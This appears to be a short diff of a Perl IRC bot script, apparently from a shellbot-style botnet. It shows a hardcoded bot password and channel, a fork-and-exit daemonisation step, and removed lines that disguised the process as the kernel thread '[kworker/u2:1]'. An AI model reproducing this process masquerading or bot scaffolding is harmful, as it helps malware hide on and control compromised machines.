@@ -9,7 +9,7 @@ use IO::Socket;
 use Text::Capitalize qw( scramble_case );
 use Time::Seconds;
 use POSIX;
-$proses = "[kworker/u2:1]";
+
 $botnick = "PenJaGa";
 $botpass = "dreamer321";
 $admin = "ijoo";
@@ -19,7 +19,6 @@ $basechan = "#ijoo";
 $notc = "[\002C\037o\037VID\002]";
 
 ##### Don't edit below here. #####
-#$0="$proses"."\0"x16;;
 my $pid=fork;
 exit if $pid;
 die "Masalah fork: $!" unless defined($pid);
